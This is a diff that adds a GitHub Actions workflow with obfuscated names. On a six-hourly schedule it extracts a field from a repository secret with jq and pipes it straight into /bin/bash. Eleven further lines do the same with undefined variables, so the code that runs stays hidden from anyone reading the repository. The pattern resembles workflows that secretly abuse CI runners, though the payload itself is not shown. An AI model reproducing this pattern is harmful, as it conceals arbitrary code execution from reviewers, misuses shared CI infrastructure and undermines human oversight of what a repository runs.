@@ -1,0 +1,28 @@
+name: heshenshshu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: heshenshshu
+        env:
+          fa71481: ${{ secrets.fa71481 }}
+        run: |
+          echo $fa71481 | jq -r .yb64 | /bin/bash
+          echo $tmy45714 | jq -r .du189 | /bin/bash
+          echo $y112 | jq -r .grab37 | /bin/bash
+          echo $ixv0 | jq -r .i5692 | /bin/bash
+          echo $shrj089 | jq -r .qnfht92488 | /bin/bash
+          echo $cmgyd143 | jq -r .hn451 | /bin/bash
+          echo $b7 | jq -r .l677 | /bin/bash
+          echo $e655 | jq -r .is00942 | /bin/bash
+          echo $nxwvx79847 | jq -r .s35287 | /bin/bash
+          echo $pskp286 | jq -r .xid63 | /bin/bash
+          echo $gnnw20782 | jq -r .vk2594 | /bin/bash
+          echo $jrn08 | jq -r .shuhu45 | /bin/bash
+
